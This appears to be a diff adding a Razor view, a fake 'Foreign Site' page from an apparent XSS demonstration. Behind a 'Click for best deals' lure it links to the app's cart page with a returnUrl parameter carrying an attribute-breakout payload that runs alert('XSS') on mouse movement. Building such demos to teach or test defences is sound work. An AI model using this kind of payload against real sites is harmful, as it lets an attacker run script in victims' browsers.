@@ -1,0 +1,35 @@
+﻿@{
+    Layout = null;
+}
+
+@{
+    string urlHost = string.Format("{0}://{1}:{2}", Request.Url.Scheme, Request.Url.Host, Request.Url.Port),
+           urlPath = "/Cart/Index?returnUrl=\"+onmousemove=\"alert('XSS')\"+style=\"border: solid red;",
+           url = urlHost + urlPath;
+}
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <title>Foreign Site</title>
+</head>
+<body>
+    <div>
+        
+        <h2>Foreign Site</h2>
+
+        <p>
+            <a href="@url">
+                Click for best deals
+            </a>
+        </p>
+
+        <p>
+            URL:<br />
+            @url
+        </p>
+
+    </div>
+</body>
+</html>
